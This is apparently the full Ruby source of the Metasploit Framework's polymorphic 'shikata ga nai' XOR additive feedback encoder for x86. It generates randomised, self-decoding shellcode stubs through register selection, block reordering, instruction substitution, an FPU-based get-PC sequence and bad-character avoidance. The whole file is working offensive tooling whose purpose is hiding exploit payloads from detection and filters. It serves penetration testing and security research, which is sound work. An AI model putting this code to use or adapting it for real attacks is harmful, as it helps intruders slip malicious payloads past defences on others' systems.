##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'rex/poly'
require 'msf/core'


class Metasploit3 < Msf::Encoder::XorAdditiveFeedback

	# The shikata encoder has an excellent ranking because it is polymorphic.
	# Party time, excellent!
	Rank = ExcellentRanking

	def initialize
		super(
			'Name'             => 'Polymorphic XOR Additive Feedback Encoder',
			'Description'      => %q{
				This encoder implements a polymorphic XOR additive feedback encoder.
				The decoder stub is generated based on dynamic instruction
				substitution and dynamic block ordering.  Registers are also
				selected dynamically.
			},
			'Author'           => 'spoonm',
			'Arch'             => ARCH_X86,
			'License'          => MSF_LICENSE,
			'Decoder'          =>
				{
					'KeySize'    => 4,
					'BlockSize'  => 4
				})
	end

	#
	# Generates the shikata decoder stub.
	#
	def decoder_stub(state)
		# If the decoder stub has not already been generated for this state, do
		# it now.  The decoder stub method may be called more than once.
		if (state.decoder_stub == nil)
			# Shikata will only cut off the last 1-4 bytes of it's own end
			# depending on the alignment of the original buffer
			cutoff = 4 - (state.buf.length & 3)
			block = generate_shikata_block(state, state.buf.length + cutoff, cutoff) || (raise BadGenerateError)

			# Set the state specific key offset to wherever the XORK ended up.
			state.decoder_key_offset = block.index('XORK')

			# Take the last 1-4 bytes of shikata and prepend them to the buffer
			# that is going to be encoded to make it align on a 4-byte boundary.
			state.buf = block.slice!(block.length - cutoff, cutoff) + state.buf

			# Cache this decoder stub.  The reason we cache the decoder stub is
			# because we need to ensure that the same stub is returned every time
			# for a given encoder state.
			state.decoder_stub = block
		end

		state.decoder_stub
	end

protected

	#
	# Returns the set of FPU instructions that can be used for the FPU block of
	# the decoder stub.
	#
	def fpu_instructions
		fpus = []

		0xe8.upto(0xee) { |x| fpus << "\xd9" + x.chr }
		0xc0.upto(0xcf) { |x| fpus << "\xd9" + x.chr }
		0xc0.upto(0xdf) { |x| fpus << "\xda" + x.chr }
		0xc0.upto(0xdf) { |x| fpus << "\xdb" + x.chr }
		0xc0.upto(0xc7) { |x| fpus << "\xdd" + x.chr }

		fpus << "\xd9\xd0"
		fpus << "\xd9\xe1"
		fpus << "\xd9\xf6"
		fpus << "\xd9\xf7"
		fpus << "\xd9\xe5"

		# This FPU instruction seems to fail consistently on Linux
		#fpus << "\xdb\xe1"

		fpus
	end

	#
	# Returns a polymorphic decoder stub that is capable of decoding a buffer
	# of the supplied length and encodes the last cutoff bytes of itself.
	#
	def generate_shikata_block(state, length, cutoff)
		# Declare logical registers
		count_reg = Rex::Poly::LogicalRegister::X86.new('count', 'ecx')
		addr_reg  = Rex::Poly::LogicalRegister::X86.new('addr')
		key_reg = nil

		if state.context_encoding
			key_reg = Rex::Poly::LogicalRegister::X86.new('key', 'eax')
		else
			key_reg = Rex::Poly::LogicalRegister::X86.new('key')
		end

		# Declare individual blocks
		endb = Rex::Poly::SymbolicBlock::End.new

		# Clear the counter register
		clear_register = Rex::Poly::LogicalBlock.new('clear_register',
			"\x31\xc9",  # xor ecx,ecx
			"\x29\xc9",  # sub ecx,ecx
			"\x33\xc9",  # xor ecx,ecx
			"\x2b\xc9")  # sub ecx,ecx

		# Initialize the counter after zeroing it
		init_counter = Rex::Poly::LogicalBlock.new('init_counter')

		# Divide the length by four but ensure that it aligns on a block size
		# boundary (4 byte).
		length += 4 + (4 - (length & 3)) & 3
		length /= 4

		if (length <= 255)
			init_counter.add_perm("\xb1" + [ length ].pack('C'))
		elsif (length <= 65536)
			init_counter.add_perm("\x66\xb9" + [ length ].pack('v'))
		else
			init_counter.add_perm("\xb9" + [ length ].pack('V'))
		end

		# Key initialization block
		init_key = nil

		# If using context encoding, we use a mov reg, [addr]
		if state.context_encoding
			init_key = Rex::Poly::LogicalBlock.new('init_key',
				Proc.new { |b| (0xa1 + b.regnum_of(key_reg)).chr + 'XORK'})
		# Otherwise, we do a direct mov reg, val
		else
			init_key = Rex::Poly::LogicalBlock.new('init_key',
				Proc.new { |b| (0xb8 + b.regnum_of(key_reg)).chr + 'XORK'})
		end

		xor  = Proc.new { |b| "\x31" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }
		add  = Proc.new { |b| "\x03" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }

		sub4 = Proc.new { |b| sub_immediate(b.regnum_of(addr_reg), -4) }
		add4 = Proc.new { |b| add_immediate(b.regnum_of(addr_reg), 4) }

		if (datastore["BufferRegister"])

			buff_reg = Rex::Poly::LogicalRegister::X86.new('buff', datastore["BufferRegister"])
			offset = (datastore["BufferOffset"] ? datastore["BufferOffset"].to_i : 0)
			if ((offset < -255 or offset > 255) and state.badchars.include? "\x00")
				raise EncodingError.new("Can't generate NULL-free decoder with a BufferOffset bigger than one byte")
			end
			mov = Proc.new { |b|
				# mov <buff_reg>, <addr_reg>
				"\x89" + (0xc0 + b.regnum_of(addr_reg) + (8 * b.regnum_of(buff_reg))).chr
			}
			add_offset = Proc.new { |b| add_immediate(b.regnum_of(addr_reg), offset) }
			sub_offset = Proc.new { |b| sub_immediate(b.regnum_of(addr_reg), -offset) }

			getpc = Rex::Poly::LogicalBlock.new('getpc')
			getpc.add_perm(Proc.new{ |b| mov.call(b) + add_offset.call(b) })
			getpc.add_perm(Proc.new{ |b| mov.call(b) + sub_offset.call(b) })

			# With an offset of less than four, inc is smaller than or the same size as add
			if (offset > 0 and offset < 4)
				getpc.add_perm(Proc.new{ |b| mov.call(b) + inc(b.regnum_of(addr_reg))*offset })
			elsif (offset < 0 and offset > -4)
				getpc.add_perm(Proc.new{ |b| mov.call(b) + dec(b.regnum_of(addr_reg))*(-offset) })
			end

			# NOTE: Adding a perm with possibly different sizes is normally
			# wrong since it will change the SymbolicBlock::End offset during
			# various stages of generation.  In this case, though, offset is
			# constant throughout the whole process, so it isn't a problem.
			getpc.add_perm(Proc.new{ |b|
				if (offset < -255 or offset > 255)
					# lea addr_reg, [buff_reg + DWORD offset]
					# NOTE: This will generate NULL bytes!
					"\x8d" + (0x80 + b.regnum_of(buff_reg) + (8 * b.regnum_of(addr_reg))).chr + [offset].pack('V')
				elsif (offset > -255 and offset != 0 and offset < 255)
					# lea addr_reg, [buff_reg + byte offset]
					"\x8d" + (0x40 + b.regnum_of(buff_reg) + (8 * b.regnum_of(addr_reg))).chr + [offset].pack('c')
				else
					# lea addr_reg, [buff_reg]
					"\x8d" + (b.regnum_of(buff_reg) + (8 * b.regnum_of(addr_reg))).chr
				end
			})

			# BufferReg+BufferOffset points right at the beginning of our
			# buffer, so in contrast to the fnstenv technique, we don't have to
			# sub off any other offsets.
			xor1 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - cutoff) ].pack('c') }
			xor2 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - 4 - cutoff) ].pack('c') }
			add1 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - cutoff) ].pack('c') }
			add2 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - 4 - cutoff) ].pack('c') }

		else
			# FPU blocks
			fpu = Rex::Poly::LogicalBlock.new('fpu',
				*fpu_instructions)

			fnstenv = Rex::Poly::LogicalBlock.new('fnstenv',
				"\xd9\x74\x24\xf4")
			fnstenv.depends_on(fpu)

			# Get EIP off the stack
			getpc = Rex::Poly::LogicalBlock.new('getpc',
				Proc.new { |b| (0x58 + b.regnum_of(addr_reg)).chr })
			getpc.depends_on(fnstenv)

			# Subtract the offset of the fpu instruction since that's where eip points after fnstenv
			xor1 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack('c') }
			xor2 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 4 - cutoff) ].pack('c') }
			add1 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack('c') }
			add2 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 4 - cutoff) ].pack('c') }
		end

		# Decoder loop block
		loop_block = Rex::Poly::LogicalBlock.new('loop_block')

		loop_block.add_perm(
			Proc.new { |b| xor1.call(b) + add1.call(b) + sub4.call(b) },
			Proc.new { |b| xor1.call(b) + sub4.call(b) + add2.call(b) },
			Proc.new { |b| sub4.call(b) + xor2.call(b) + add2.call(b) },
			Proc.new { |b| xor1.call(b) + add1.call(b) + add4.call(b) },
			Proc.new { |b| xor1.call(b) + add4.call(b) + add2.call(b) },
			Proc.new { |b| add4.call(b) + xor2.call(b) + add2.call(b) })

		# Loop instruction block
		loop_inst = Rex::Poly::LogicalBlock.new('loop_inst',
			"\xe2\xf5")
			# In the current implementation the loop block is a constant size,
			# so really no need for a fancy calculation.  Nevertheless, here's
			# one way to do it:
			#Proc.new { |b|
			#	# loop <loop_block label>
			#	# -2 to account for the size of this instruction
			#	"\xe2" + [ -2 - b.size_of(loop_block) ].pack('c')
			#})

		# Define block dependencies
		clear_register.depends_on(getpc)
		init_counter.depends_on(clear_register)
		loop_block.depends_on(init_counter, init_key)
		loop_inst.depends_on(loop_block)

		begin
			# Generate a permutation saving the ECX and ESP registers
			loop_inst.generate([
				Rex::Arch::X86::ESP,
				Rex::Arch::X86::ECX ], nil, state.badchars)
		rescue RuntimeError => e
			raise EncodingError
		end
	end

	def sub_immediate(regnum, imm)
		return "" if imm.nil? or imm == 0
		if imm > 255 or imm < -255
			"\x81" + (0xe8 + regnum).chr + [imm].pack('V')
		else
			"\x83" + (0xe8 + regnum).chr + [imm].pack('c')
		end
	end
	def add_immediate(regnum, imm)
		return "" if imm.nil? or imm == 0
		if imm > 255 or imm < -255
			"\x81" + (0xc0 + regnum).chr + [imm].pack('V')
		else
			"\x83" + (0xc0 + regnum).chr + [imm].pack('c')
		end
	end
	def inc(regnum)
		[0x40 + regnum].pack('C')
	end
	def dec(regnum)
		[0x48 + regnum].pack('C')
	end

end
